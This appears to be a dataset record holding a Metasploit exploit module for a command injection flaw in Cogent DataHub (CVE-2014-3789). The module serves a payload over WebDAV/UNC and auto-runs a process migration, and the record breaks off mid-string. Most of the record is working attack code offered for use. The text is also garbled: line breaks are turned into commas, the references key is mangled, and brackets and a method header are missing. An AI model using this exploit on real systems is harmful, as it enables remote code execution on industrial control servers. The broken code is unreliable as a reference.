{
    "text": "vul_name : Cogent DataHub Command Injection ， vul_cve : CVE-2014-3789 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ，  # Exploitation is reliable , but the service hangs and needs manual restarting. ， Rank = ManualRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : EXE ， def initialize ， super (  ， 'Name' => 'Cogent DataHub Command Injection' ,  ， 'Description' => %q{ ， This module exploits an injection vulnerability in Cogent DataHub prior ， to 7.3.5. The vulnerability exists in the GetPermissions.asp page , which ， makes insecure use of the datahub_command function with user controlled ， data , allowing execution of arbitrary datahub commands and scripts. This ， module has been tested successfully with Cogent DataHub 7.3.4 on ， Windows 7 SP1. ， } ,  ， 'Author' => [  ， 'John Leitch' ,  # Vulnerability discovery ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'Platform' => 'win' ,  ， ' ，  [  ，  [ 'ZDI' , '14-136' ]  ,  ，  [ 'CVE' , '2014-3789' ]  ,  ，  [ 'BID' , '67486' ]  ，  ]  ,  ， 'Stance' => Msf : Exploit : Stance : Aggressive ,  ， 'DefaultOptions' => { ， 'WfsDelay' => 30 ,  ， 'InitialAutoRunScript' => 'migrate -f' ， } ,  ， 'Targets' => ，  [  ，  [ 'Cogent DataHub < 7.3.5' , { } ]  ,  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Apr 29 2014' ， register_options (  ，  [  ， OptString.new ( 'URIPATH' ,  [ true , 'The URI to use ( do not change ) ' , '/' ]  )  ,  ， OptPort.new ( 'SRVPORT' ,  [ true , 'The daemon port to listen on ' + ， ' ( do not change ) ' , 80 ]  )  ,  ， OptInt.new ( 'WEBDAV_DELAY' ,  [ true , 'Time that the HTTP Server will ' + ， 'wait for the payload request' , 20 ]  )  ,  ， OptString.new ( 'UNCPATH' ,  [ false , 'Override the UNC path to use.' ]  )  ，  ]  , self.class )  ， end ， def autofilter ， false ， end ， case request.method ， when 'OPTIONS' ， process_options ( cli , request )  ， when 'PROPFIND' ， process_propfind ( cli , request )  ， when 'GET' ， process_get ( cli , request )  ， vprint_status ( \" # {request.method} => 404 (  # {request.uri} ) \" )  ， resp = create_response ( 404 , \"Not Found\" )  ， resp.body = \"",
    "time": "2014.06.25"
}